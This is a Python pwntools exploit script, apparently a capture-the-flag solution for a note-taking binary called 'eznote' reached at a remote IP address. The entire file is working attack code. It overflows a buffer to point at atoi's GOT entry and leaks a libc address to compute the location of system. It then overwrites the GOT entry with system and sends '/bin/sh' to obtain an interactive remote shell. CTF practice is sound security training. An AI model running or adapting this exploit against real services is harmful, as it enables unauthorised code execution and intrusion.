from pwn import *

#r = process("./eznote")
# gdb.attach(r,'''
# 	b*write_note
# 	b*read_note
# 	''')

r = remote("45.76.179.184", 4444)

atoi_got = 0x601058
KEY = 0x6010A0
system_offset = 0x04f440
atoi_offset = 0x40680

#r.recvuntil("key: ")
r.recv()
r.send("0x1337EzNote" + "\x00"*4 + p64(8) + p64(atoi_got-1))
r.recvuntil(">>>")
r.send("A"*0x1f8 + p64(KEY+0x10))
r.recvuntil("index: ")
r.sendline("10")
r.recvuntil("Content: ")
r.send("\x00")
r.recvuntil(">>>")
r.sendline("1")
r.recvuntil("index: ")
r.sendline("10")

leak = r.recv()[1:8].strip("\x00").ljust(8, "\x00")
leak = u64(leak)
base = leak - atoi_offset
system = base + system_offset

print "LEAK: %x" % leak
print "BASE: %x" % base
print "SYSTEM: %x" % system

# r.recvuntil(">>>")
r.send("A"*0x1f8 + p64(KEY+0x10))
r.recvuntil("index: ")
r.sendline("10")
r.recvuntil("Content: ")
r.send(p64(system << 8))

r.recvuntil(">>>")
r.sendline("/bin/sh\x00")

r.interactive()
